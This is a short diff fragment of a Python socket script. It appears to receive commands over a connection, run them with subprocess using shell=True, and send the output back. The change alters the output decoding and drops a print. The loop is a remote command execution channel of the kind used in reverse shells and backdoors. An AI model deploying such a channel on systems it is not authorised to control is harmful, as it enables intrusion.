@@ -24,7 +24,7 @@ def send(msg, conn):
     send_length += b' ' * (HEADER - len(send_length))
     conn.send(send_length)
     conn.send(message)
-    print(recv(conn))
+
 
 connected = True
 while connected:
@@ -32,4 +32,4 @@ while connected:
 
     proc = subprocess.Popen(msg.split(" "), stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
-    send(str(out), client)
+    send(out.decode(FORMAT), client)
